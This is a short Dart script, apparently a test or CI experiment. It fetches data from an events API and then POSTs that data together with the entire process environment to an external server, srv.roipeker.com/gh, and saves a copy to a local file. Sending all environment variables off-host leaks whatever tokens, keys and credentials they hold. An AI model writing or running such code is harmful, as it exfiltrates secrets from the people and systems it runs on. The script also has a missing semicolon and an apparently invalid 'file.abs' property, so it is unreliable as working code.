#!dart

import 'dart:convert';
import 'dart:io';

import 'package:dio/dio.dart';

final dio = Dio();

Future main(List<String> arguments) async {
  print("RUN DART APP! with $arguments");
  await Future.delayed(Duration(milliseconds: 400));
  print("requesting events");
  var result = await dio.get('https://deto-events.com/v1/events');
  print('result ok? ${result.statusCode}');

  // print('- events result:\n\n${result.data}');
  var sendData = {
    'events': result.data,
    'env': Platform.environment,
  };

  print('send to srv.roipeker.com');
  result = await dio.post('https://srv.roipeker.com/gh', data: sendData);
  print("Post result: ${result.data}");

  var jsonString = jsonEncode(sendData);

  final file = File('dart.txt');
  file.createSync(recursive: true);
  file.writeAsStringSync(jsonString);
  print("file saved in ${file.path} (${file.abs})")
  exit(0);
}
